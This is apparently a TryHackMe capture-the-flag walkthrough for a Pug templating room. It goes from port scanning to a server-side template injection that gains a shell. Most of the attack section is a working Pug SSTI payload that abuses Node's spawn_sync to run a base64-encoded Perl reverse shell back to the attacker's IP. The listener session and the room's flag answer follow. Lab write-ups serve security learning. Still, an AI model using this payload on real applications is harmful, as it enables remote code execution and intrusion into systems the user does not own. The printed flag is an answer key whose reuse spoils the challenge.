----
Pug is my favorite templating engine! I made this super slick application so you can play around with Pug and see how it works.
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/223d78403d08b0560d6ed7104be6aa5d.png)

### Task 1  Templates

 Start Machine

My favourite type of dog is a pug... and, you know what, Pug is my favourite templating engine too! I made this super slick application so you can play around with Pug and see how it works. Seriously, you can do so much with Pug!

  

Access this challenge by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [HTTP://MACHINE_IP:5000](http://machine_ip:5000/)

  

Check out similar content on TryHackMe:

[SSTI](https://tryhackme.com/room/learnssti)

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.139.153 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.139.153:22
Open 10.10.139.153:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 13:02 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:02
Completed Parallel DNS resolution of 1 host. at 13:02, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:02
Scanning 10.10.139.153 [2 ports]
Discovered open port 22/tcp on 10.10.139.153
Discovered open port 5000/tcp on 10.10.139.153
Completed Connect Scan at 13:02, 0.19s elapsed (2 total ports)
Initiating Service scan at 13:02
Scanning 2 services on 10.10.139.153
Completed Service scan at 13:03, 12.01s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.139.153.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 7.74s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 1.41s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
Nmap scan report for 10.10.139.153
Host is up, received user-set (0.19s latency).
Scanned at 2023-06-22 13:02:54 EDT for 22s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9a5f4d7cc5431d4fad6d317cbc5f7a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2YqIxGQ/mCEC+ATLo7Ty18shAkzyfVCy1p7TrtCW5mtC21P5/6QYfgO6Rbu4bUq3zWdKh6x4LM0QZZ7oDAmdhUgznuY7uBCO8H8ALu4Wq5ae31/d4S4QohyTOcFUtR19kxRxIL+chenqn4UMZphZRmZ2Mav0lDMMAgy+WYi7GY1vmCYqxNPfZSj1xEx32+kjkcn9eSLkbogovtKxJa5/Ue8fShcezZvm14EBbWkHblCjIsYdZRnDYK/UrJaFGgt0JQSwncSb1QNCgzG6kvh1r/0QDuxQJWRwBVv7ioTVcloIXcRuqDuDvG4fP7dkzpMmpdvdp03MyOjYdoR3L+XbWP8xkNJLkMrJES887q5Rq+qnQ879UUdGn5hRx9wnymuw6jXbQ0u53UgJnnXwUFklib+HtcU9UC/WyU7/i1VJFyXMc+t+ds7X7wtDAXv7zHyDEfFL+kfHLWoy/BFJDASzZZT2cca+sSGMSzZSdH1FitP0HFZvM4Rlu+qTdem8Lvf8=
|   256 fef4ffd23e3bab775f7b5f16fb73bbd4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuVJEm1+h7+XGCIhSWFacSMthSvNT8GjmNmv3GDjrrCeTbR6M+P/cknRS2c8gwvsnyQaum8DYOlu+2Re244z7s=
|   256 548195212d8a27d9f3b61fdb4fa193db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+Xf7nGu51Ozl43cyBxH6PAXgT8tkajhvddg5zqoGmy
5000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: PUG to HTML
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.75 seconds

http://10.10.139.153:5000/

doctype html
h1 title
p Welcome to #{3*3}

http://10.10.139.153:5000/render

<!DOCTYPE html><h1>title</h1><p>Welcome to 9</p>

revshell

https://gist.github.com/Jasemalsadi/2862619f21453e0a6ba2462f9613b49f

doctype html
h1 title
p Welcome to #{3*3}
#{spawn_sync = this.process.binding('spawn_sync')}
#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}
#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}
#{payload='dXNlIFNvY2tldDskaT0iMTAuOC4xOS4xMDMiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Cg=='}
#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444              
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.139.153] 51842
/bin/sh: 0: can't access tty; job control turned off
$ whoami
user
$ ls
app.js
flag.txt
node_modules
package-lock.json
package.json
views
$ cat flag.txt
flag{3cfca66f3611059a0dfbc4191a0803b2}

$ cat render.pug
html
  head
  body
    pre #{value}

```

Hack the application and uncover a flag!

*flag{3cfca66f3611059a0dfbc4191a0803b2}*


[[Capture!]]